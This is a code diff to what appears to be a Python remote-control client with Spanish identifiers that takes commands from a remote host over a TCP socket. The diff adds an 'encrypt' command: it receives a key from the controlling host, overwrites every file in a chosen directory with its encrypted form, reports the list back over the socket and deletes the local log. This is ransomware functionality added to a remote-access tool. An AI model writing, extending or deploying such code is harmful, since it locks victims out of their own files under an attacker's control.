@@ -7,6 +7,7 @@ import struct
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
+from cryptography.fernet import Fernet
 
 class TCP:
     def __init__(self, host, port):
@@ -312,6 +313,44 @@ class TCP:
         else:
             self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
+    def encrypt(self, cmd):
+        key = self.__sock.recv(1024)
+
+        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+
+        if os.path.isdir(directorio):
+            archivos = []
+            for i in os.listdir(directorio):
+                archivo = f"{directorio}/{i}"
+                if os.path.isfile(archivo):
+                    archivos.append(archivo)
+
+            with open(f"{directorio}/.info.dat", 'w') as texto:
+                f = Fernet(key)
+                cont = 0
+                for i in archivos:
+                    nombre = os.path.basename(i)
+                    with open(i, 'rb') as archivo:
+                        data = archivo.read()
+                    archivo.close()
+
+                    dataEncrypt = f.encrypt(data)
+
+                    with open(i, 'wb') as archivo:
+                        archivo.write(dataEncrypt)
+                    archivo.close()
+                    texto.write(f"[+] Archivo \"{nombre}\" encriptado\n")
+                    cont += 1
+            texto.close()
+
+            self.__sock.send(f"{cont} archivos encriptados".encode())
+
+            self.enviarArchivo(f"{directorio}/.info.dat")
+            os.remove(f"{directorio}/.info.dat")
+
+        else:
+            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
+
     def shell(self):
         try:
             while True:
@@ -385,6 +424,13 @@ class TCP:
                 elif cmd.lower()[:5] == "unzip":
                     try:
                         self.descomprimir(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:7] == "encrypt":
+                    try:
+                        self.encrypt(cmd)
 
                     except:
                         continue
